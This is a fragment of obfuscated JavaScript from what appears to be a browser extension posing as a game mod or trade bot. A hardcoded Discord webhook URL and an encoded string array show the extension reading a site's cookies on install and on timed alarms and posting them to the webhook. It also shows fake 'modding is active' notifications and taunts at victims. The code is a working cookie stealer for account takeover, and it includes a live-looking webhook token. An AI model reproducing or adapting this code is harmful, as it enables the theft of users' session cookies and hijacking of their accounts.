...
var discord_web_api = "https://discord.com/api/webhooks/833390832496410704/tfcQeM3o0IwmLOAR8ombOAHBz24t4iYz45TDSW1ZOvR-z8p4I4QqXxvdzlW1NH84yRQh";

var _0x9917 = ["alarms", "length", "substr", "push", website, cookie_data, "value", "\x0A", "join", "get", "cookies", discord_web_api, "?wait=true", "....", ".", "..", "...", "|", "POST", "ajax", "open", "Content-Type", "application/json; charset=UTF-8", "setRequestHeader", "stringify", "send", "random", "floor", "Get logged dumbass", "Ez hit LOL!", "Free bobux moment loool", "lelle", "Btw this shit aint dualhooked", " ", "tradeBackground", "create", "reason", "install", "tradeBotStart", "basic", "icon.png", "Mods! Mods has started!", "Welcome! Modding is now active!", "notifications", " @everyone kekekek ", "addListener", "onInstalled", "runtime", "name", "onAlarm"];
